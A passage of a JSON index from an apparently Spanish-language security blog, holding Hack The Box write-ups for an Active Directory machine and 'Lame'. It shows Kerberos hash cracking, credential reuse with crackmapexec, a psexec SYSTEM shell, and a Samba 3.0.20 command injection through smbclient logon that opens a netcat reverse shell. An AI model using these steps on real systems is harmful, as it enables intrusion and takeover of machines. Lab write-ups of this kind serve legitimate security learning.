61631522c179033345c99c562311fd47b08302ece8e41c32e802214c0addf369fdd3ccd8f6fd3ca705e0eaddf8ce7fcd3c24d3baec11a2544a3c43de7b1cf42e302fe4991d1a08f98ef4d5f3b87d92724b5819a67460a760fab8e0cd50d8f6a35056e5175b4aa19565be1c98937bf71e3b29944c544220913b4284be18092a694f31b159d50aae15e9bcb329edeac0b9cc63d81a78b2cc5e2f680b44343697bedf401c95ac21d22faf2c7576273acebacfc1312c1f1f0020dd5e9c47d9a438f5249210961d2ed9dbe595d08de428344f72f5503d6785e5f100206be26017c118db6264015083ed00596eb4330e4c0bab1ea84372c69050adb00fae353ffe94643fc202d00aef8f1080b49e967dbc90775fc104dTenemos el ticket, este hash debemos romperlo para obtener la contraseña, para ello se pueden utilizar diversas herramientas, en este caso utilizaremos john y el diccionario rockyou.txt:john --wordlist=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusTicketmaster1968 (?)     1g 0:00:00:05 DONE (2023-02-06 19:54) 0.1972g/s 2078Kp/s 2078Kc/s 2078KC/s Tiffani1432..Thrash1Use the \"--show\" option to display all of the cracked passwords reliablySession completed. Observamos que la contraseña es Ticketmaster1968, para verificar si la contraseña corresponde a la de administrador utilizamos crackmapexec:crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)SMB         10.10.10.100    445    DC               [+] active.htb\\Administrator:Ticketmaster1968 (Pwn3d!)Observamos que todo es correcto, además crackmapexec nos dice (Pwn3d!).Como tenemos las credenciales de usuario administrador podemos intentar conectarnos por psexec.py, pues deberiamos tener capacidad de escritura en los recursos compartidos:psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100Impacket v0.10.1.dev1+20230203.111903.32178de6 - Copyright 2022 Fortra[*] Requesting shares on 10.10.10.100.....[*] Found writable share ADMIN$[*] Uploading file LxLKUFfn.exe[*] Opening SVCManager on 10.10.10.100.....[*] Creating service iIYA on 10.10.10.100.....[*] Starting service iIYA.....[!] Press help for extra shell commandsMicrosoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation.  All rights reserved.C:\\Windows\\system32&gt; whoamint authority\\system¡Entramos!Ahora debemos encontrar la flag para ellos vamos al directorio personal del administrator:C:\\Users\\Administrator\\Desktop&gt; type root.txt1b55be15cf3b22b97b!Listo!Hemos vulnerado completamente la máquina hasta ser administradores.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Lame HTB Write-up",
    "url": "/posts/Lame/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Exploit, Linux, Easy",
    "date": "2023-02-05 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Lame, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del s...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Lame, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema.  Explotación de samba 3.0.20.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.10.3PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=143 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS --open -min-rate 5000 -Pn 10.10.10.103 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds3632/tcp open  distccdVamos a realizar un escanéo de servicios:sudo nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN ServiceScanComo resultado del escaneo tenemos:PORT     STATE SERVICE     VERSION21/tcp   open  ftp         vsftpd 2.3.4| ftp-syst: |   STAT: | FTP server status:|      Connected to 10.10.14.17|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      vsFTPd 2.3.4 - secure, fast, stable|_End of status|_ftp-anon: Anonymous FTP login allowed (FTP code 230)22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)| ssh-hostkey: |   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-os-discovery: |   OS: Unix (Samba 3.0.20-Debian)|   Computer name: lame|   NetBIOS computer name: |   Domain name: hackthebox.gr|   FQDN: lame.hackthebox.gr|_  System time: 2023-02-17T19:26:51-05:00|_clock-skew: mean: 2h30m10s, deviation: 3h32m08s, median: 9s|_smb2-time: Protocol negotiation failed (SMB2)| smb-security-mode: |   account_used: &lt;blank&gt;|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)ExplotaciónSi vamos revisando las versiones, vemos el samba 3.0.20, si lo buscamos en searchsploit:searchsploit samba 3.0.20--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                                                   |  Path--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                                                                                                           | multiple/remote/10095.txtSamba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                 | unix/remote/16320.rbSamba &lt; 3.0.20 - Remote Heap Overflow                                                                                                                                            | linux/remote/7701.txtSamba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                    | linux_x86/dos/36741.pyEncontramos algunos exploits, vamos a abrir el unix/remote/16320.rb:        def exploit                connect                # lol?                username = \"/=`nohup \" + payload.encoded + \"`\"                begin                        simple.client.negotiate(false)                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)                rescue ::Timeout::Error, XCEPT::LoginError                        # nothing, it either worked or it didn't ;)                end                handler        endSi analizamos la función tenemos que ingresar en username ”/=`nohup “ + payload.encoded + “`“ vamos a intentarlo manual.Utilizamos smbmap para identificar a que recursos tenemos acceso:smbmap -H 10.10.10.3[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                                Disk                                                    Permissions     Comment        ----                                                    -----------     -------        print$                                                  NO ACCESS       Printer Drivers        tmp                                                     READ, WRITE     oh noes!        opt                                                     NO ACCESS        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))Entramos con smbclient:smbclient //10.10.10.3/tmp -NAnonymous login successfulTry \"help\" to get a list of possible commands.smb:Si usamos el comando help podemos ver todo lo que podemos utilizar, según el exploit necesitamos un campo de username, y el único que lo tiene en el logon, por lo tanto, intentamos generar una conexión reversa hacia nuestra máquina utilizando netcat:smb: \\&gt; logon \"/=`nohup nc -e /bin/bash 10.10.14.17 1234`\"Password: Si vemos nuestro netcat:nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.10.3] 50387whoamirootAhora buscamos la flag:cat root.txt20814bf60da255921f3718003536cdac!Listo!Hemos vulnerado completamente la máquina.Nos vemos, hasta la próxima."
  }
  
]

